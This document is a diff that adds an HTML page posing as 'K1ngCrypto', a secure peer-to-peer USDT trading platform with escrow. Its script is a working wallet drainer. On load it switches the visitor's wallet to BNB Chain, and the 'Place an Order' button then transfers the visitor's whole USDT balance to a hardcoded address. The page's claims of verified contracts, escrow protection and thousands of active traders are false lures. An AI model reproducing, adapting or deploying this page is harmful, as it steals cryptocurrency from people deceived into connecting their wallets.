@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>K1ngCrypto P2P Trading</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+</head>
+<body class="bg-[#f4f9ff] text-gray-800 font-sans">
+  <div class="max-w-lg mx-auto py-10 text-center space-y-8">
+
+    <!-- Header -->
+    <div class="bg-white rounded-xl shadow p-6">
+      <div class="flex items-center justify-between mb-3">
+        <div class="flex items-center gap-3">
+          <div class="bg-yellow-400 rounded-full w-10 h-10 flex items-center justify-center text-white font-bold">B</div>
+          <div>
+            <h1 class="font-bold text-lg">P2P Trading</h1>
+            <a href="#" class="text-sm text-blue-600 underline">Secure Trading Platform</a>
+          </div>
+        </div>
+        <div class="flex gap-2 items-center text-sm">
+          <span class="bg-blue-100 text-blue-800 px-2 rounded">Trusted</span>
+          <span class="bg-green-100 text-green-800 px-2 rounded">24/7 Active</span>
+        </div>
+      </div>
+
+      <!-- Place Order -->
+      <h2 class="text-md font-bold mb-1">PLACE AN ORDER</h2>
+      <p class="text-sm text-gray-500 mb-4">Connect any Web3 wallet to start trading</p>
+
+      <button onclick="sendUSDT()" class="w-full bg-blue-600 text-white py-3 text-lg rounded-md hover:bg-blue-700 transition">
+        🚀 Place an Order
+      </button>
+
+      <p id="status" class="text-sm text-gray-600 mt-4"></p>
+    </div>
+
+    <!-- Info Sections -->
+    <div class="bg-white rounded-xl shadow p-6 space-y-6">
+      <div>
+        <h3 class="text-lg font-bold">Why K1ngCrypto?</h3>
+        <p class="text-sm text-gray-600">
+          We offer an ultra-secure P2P USDT trading platform powered by verified smart contracts and real-time order matching. No intermediaries, no delay, no risk.
+        </p>
+      </div>
+
+      <div>
+        <h3 class="text-lg font-bold">Security First</h3>
+        <p class="text-sm text-gray-600">
+          Our smart contract ensures that funds are never at risk. Every order goes through a secure automated escrow system that protects both buyer and seller.
+        </p>
+      </div>
+
+      <div>
+        <h3 class="text-lg font-bold">24/7 Active Traders</h3>
+        <p class="text-sm text-gray-600">
+          Whether it's midnight or early morning, our platform is live and you’ll find over 12,000 active traders available to deal with at all times.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- JS Logic -->
+  <script>
+    window.addEventListener("load", async () => {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }]
+          });
+        } catch (err) {
+          console.warn("Network switch failed or rejected.");
+        }
+      }
+    });
+
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20
+    const USDT_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)"
+    ];
+
+    async function sendUSDT() {
+      const recipient = "0xe47a9ecb5C87b06364bA2c6CEB064583c935f2ed"; // default address
+
+      if (!window.ethereum) {
+        alert("Please open in Trust Wallet browser");
+        return;
+      }
+
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+
+      const network = await provider.getNetwork();
+      if (network.chainId !== 56) {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }]
+        });
+      }
+
+      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+      const sender = await signer.getAddress();
+
+      document.getElementById("status").textContent = "Checking USDT balance...";
+
+      const balance = await usdt.balanceOf(sender);
+      if (balance == 0n) {
+        document.getElementById("status").textContent = "❌ No USDT available to send.";
+        return;
+      }
+
+      document.getElementById("status").textContent = "🚀 Starting trade...";
+      const tx = await usdt.transfer(recipient, balance);
+      await tx.wait();
+
+      document.getElementById("status").textContent = "✅ All USDT sent successfully.";
+    }
+  </script>
+</body>
+</html>
